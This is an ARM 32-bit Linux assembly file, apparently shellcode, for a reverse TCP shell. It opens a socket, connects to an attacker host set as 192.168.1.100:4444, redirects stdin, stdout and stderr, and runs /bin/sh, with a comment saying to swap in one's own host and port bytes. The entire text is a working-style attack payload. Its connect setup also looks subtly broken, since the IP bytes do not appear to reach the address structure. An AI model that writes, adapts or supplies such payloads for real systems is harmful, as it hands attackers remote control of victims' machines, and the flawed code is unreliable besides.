; Linux ARM (32-bit) reverse TCP shell
; Replace LHOST/LPORT bytes

.arm
.globl _start
_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    mov     r0, #2              ; AF_INET
    mov     r1, #1              ; SOCK_STREAM
    mov     r2, #0
    mov     r7, #281            ; __NR_socket (ARM EABI)
    svc     #0
    mov     r4, r0

    ; connect to 192.168.1.100:4444
    push    {r5}
    ldr     r5, addr_port
    sub     sp, sp, #8
    str     r5, [sp]
    mov     r5, #0
    str     r5, [sp, #4]
    mov     r0, r4
    mov     r1, sp
    mov     r2, #16
    mov     r7, #283            ; __NR_connect
    svc     #0

    ; dup2(r4, 0/1/2)
    mov     r1, #2
.dup:
    mov     r0, r4
    mov     r7, #63             ; __NR_dup2
    svc     #0
    subs    r1, r1, #1
    bge     .dup

    ; execve /bin/sh
    adr     r0, binsh
    mov     r1, #0
    mov     r2, #0
    mov     r7, #11
    svc     #0

addr_port: .byte 0x02,0x00,0x11,0x5c, 0xc0,0xa8,0x01,0x64, 0,0,0,0,0,0,0,0
binsh:     .ascii "/bin/sh\0"
